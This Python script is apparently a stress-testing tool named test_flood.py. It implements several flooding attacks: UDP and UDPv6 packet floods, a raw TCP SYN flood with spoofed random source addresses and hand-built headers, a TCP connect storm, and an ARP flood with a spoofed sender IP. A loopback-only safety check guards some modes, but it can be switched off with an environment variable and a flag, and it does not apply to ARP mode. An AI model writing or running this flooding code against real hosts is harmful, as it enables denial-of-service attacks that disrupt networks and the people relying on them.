import socket
import sys
import time
import os
import ipaddress

if len(sys.argv) < 2:
    print("Usage: python3 test_flood.py <TARGET_IP_OR_INTERFACE> [udp|tcp|udp6|arp]")
    sys.exit(1)

target = sys.argv[1]
proto = sys.argv[2] if len(sys.argv) > 2 else "udp"
proto = proto.lower()
port = 8000
data = b"X" * 1024

# Safety: by default only allow targeting loopback (localhost).
# To permit external targets you must BOTH set env var `ALLOW_TEST_FLOOD_EXTERNAL=1`
# and pass the `--allow-external` flag on the command line.
allow_external_flag = '--allow-external' in sys.argv
allow_external_env = os.getenv('ALLOW_TEST_FLOOD_EXTERNAL') == '1'

# For ARP mode the `target` is expected to be a local interface name (e.g., eth0)
is_arp_mode = proto == 'arp'

if not is_arp_mode:
    try:
        dest_ip = socket.gethostbyname(target)
        ip_obj = ipaddress.ip_address(dest_ip)
        if not ip_obj.is_loopback and not (allow_external_env and allow_external_flag):
            print("[!] Safety check: external targets are disabled by default.")
            print("    To allow external targets set ALLOW_TEST_FLOOD_EXTERNAL=1 and pass --allow-external flag.")
            sys.exit(1)
    except Exception:
        # If resolution fails, be conservative and refuse to run unless explicit allow
        if not (allow_external_env and allow_external_flag):
            print("[!] Safety check: could not resolve target; external targets disabled by default.")
            print("    To allow external targets set ALLOW_TEST_FLOOD_EXTERNAL=1 and pass --allow-external flag.")
            sys.exit(1)

print(f"[!] Target: {target} | Mode: {proto.upper()} | Starting Volumetric Storm...")
count = 0
start = time.time()

try:
    if proto == "udp":
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            sock.sendto(data, (target, port))
            count += 1
            if count % 10000 == 0:
                elapsed = time.time() - start
                pps = count / elapsed if elapsed > 0 else 0
                print(f"[>] Outbound UDPv4 PPS: {pps:.2f} | Total: {count}")
                
    elif proto == "udp6":
        sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
        while True:
            sock.sendto(data, (target, port))
            count += 1
            if count % 10000 == 0:
                elapsed = time.time() - start
                pps = count / elapsed if elapsed > 0 else 0
                print(f"[>] Outbound UDPv6 PPS: {pps:.2f} | Total: {count}")

    elif proto == "tcp":
        import platform
        import random
        import struct

        # Helper function for internet checksum calculation (RFC 1071)
        def calc_checksum(msg):
            if len(msg) % 2 != 0:
                msg += b'\x00'
            s = 0
            for i in range(0, len(msg), 2):
                w = msg[i] + (msg[i+1] << 8)
                s += w
            s = (s >> 16) + (s & 0xffff)
            s += (s >> 16)
            return (~s) & 0xffff

        # Check if we can run as raw socket (Linux & Root)
        is_raw_supported = False
        if platform.system().lower() == "linux":
            try:
                # Resolve target IP
                dest_ip = socket.gethostbyname(target)
                # Test opening a raw socket
                test_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                test_sock.close()
                is_raw_supported = True
            except PermissionError:
                print("[!] Root privileges required for Raw TCP SYN Flood. Falling back to TCP connect flood...")
            except Exception as e:
                print(f"[!] Raw socket test failed ({e}). Falling back to TCP connect flood...")
        else:
            print("[!] Raw TCP SYN Flood requires a Linux OS. Falling back to TCP connect flood...")

        if is_raw_supported:
            dest_ip = socket.gethostbyname(target)
            print(f"[+] Launching Raw TCP SYN Flood targeting {dest_ip}:{port} with spoofed source IPs...")
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            while True:
                try:
                    # Generate random source IP and source port
                    src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                    src_port = random.randint(1024, 65535)

                    # Build IP Header (20 bytes)
                    ip_ver = 4
                    ip_ihl = 5
                    ip_tos = 0
                    ip_tot_len = 40  # IP Header (20) + TCP Header (20)
                    ip_id = random.randint(10000, 65535)
                    ip_frag_off = 0
                    ip_ttl = 255
                    ip_proto = socket.IPPROTO_TCP
                    ip_check = 0  # Kernel fills this when using IP_HDRINCL on some systems, or we can compute it.
                    ip_saddr = socket.inet_aton(src_ip)
                    ip_daddr = socket.inet_aton(dest_ip)

                    ip_ihl_ver = (ip_ver << 4) + ip_ihl
                    ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

                    # Build TCP Header (20 bytes)
                    tcp_source = src_port
                    tcp_dest = port
                    tcp_seq = random.randint(0, 4294967295)
                    tcp_ack_seq = 0
                    tcp_doff = 5
                    tcp_flags = 0x02  # SYN Flag
                    tcp_window = 5840
                    tcp_check = 0
                    tcp_urg_ptr = 0

                    tcp_offset_res = (tcp_doff << 4) + 0
                    tcp_header = struct.pack('!HHLLBBHHH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)

                    # Build Pseudo Header for TCP Checksum calculation
                    psh = struct.pack('!4s4sBBH', ip_saddr, ip_daddr, 0, ip_proto, len(tcp_header))
                    psh = psh + tcp_header

                    # Calculate and inject TCP Checksum
                    tcp_check = calc_checksum(psh)
                    tcp_header = struct.pack('!HHLLBBH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window) + struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)

                    # Send packet
                    packet = ip_header + tcp_header
                    s.sendto(packet, (dest_ip, 0))

                    count += 1
                    if count % 10000 == 0:
                        elapsed = time.time() - start
                        pps = count / elapsed if elapsed > 0 else 0
                        print(f"[>] Outbound Raw TCP SYN Flood PPS: {pps:.2f} | Total: {count}")
                except Exception:
                    pass
        else:
            # Fallback connection-oriented connect-storm
            print(f"[+] Starting TCP connection-oriented storm targeting {target}:{port}...")
            while True:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    sock.connect((target, port))
                    sock.sendall(data)
                    sock.close()
                except Exception:
                    pass
                count += 1
                if count % 100 == 0:
                    elapsed = time.time() - start
                    pps = count / elapsed if elapsed > 0 else 0
                    print(f"[>] Outbound TCP connection attempts: {count} | PPS: {pps:.2f}")

    elif proto == "arp":
        import platform
        if platform.system().lower() != "linux":
            print("[!] Raw ARP packet injection via socket.AF_PACKET is only supported on Linux hosts.")
            sys.exit(1)
        
        # Parse optional sender and target IPs for ARP flood
        sender_ip = sys.argv[3] if len(sys.argv) > 3 else "10.10.0.99"
        target_ip = sys.argv[4] if len(sys.argv) > 4 else "10.10.0.1"
        print(f"[+] Starting ARP Flood on interface {target} | Spoofed Sender IP: {sender_ip} | Target IP: {target_ip}...")
        
        try:
            # Requires root privileges and works on Linux raw sockets
            # Note: For ARP, target parameter should be the local interface name (e.g. eth0)
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
            sock.bind((target, 0))
            
            # Destination MAC: Broadcast
            # Source MAC: Dummy
            # EtherType: ARP (0x0806)
            eth_hdr = b'\xff\xff\xff\xff\xff\xff\x00\x11\x22\x33\x44\x55\x08\x06'
            
            # ARP Header + Body
            # Hardware: Ethernet (1), Protocol: IPv4 (0x0800), Hlen: 6, Plen: 4, Opcode: Request (1)
            # Sender MAC, Sender IP, Target MAC (00:00:00:00:00:00), Target IP
            arp_body = b'\x00\x01\x08\x00\x06\x04\x00\x01' + \
                       b'\x00\x11\x22\x33\x44\x55' + socket.inet_aton(sender_ip) + \
                       b'\x00\x00\x00\x00\x00\x00' + socket.inet_aton(target_ip)
            
            packet = eth_hdr + arp_body
            while True:
                sock.send(packet)
                count += 1
                if count % 10000 == 0:
                    elapsed = time.time() - start
                    pps = count / elapsed if elapsed > 0 else 0
                    print(f"[>] Outbound Raw ARP Injection: {count} | PPS: {pps:.2f}")
        except PermissionError:
            print("[!] Permission Denied. Raw packet socket injection requires root/administrator privileges.")
        except Exception as e:
            print(f"[!] Raw ARP injection failed: {e}. Note: For ARP simulation, target must be the local interface name (e.g., eth0).")
            
except KeyboardInterrupt:
    print("\n[!] Test Terminated.")
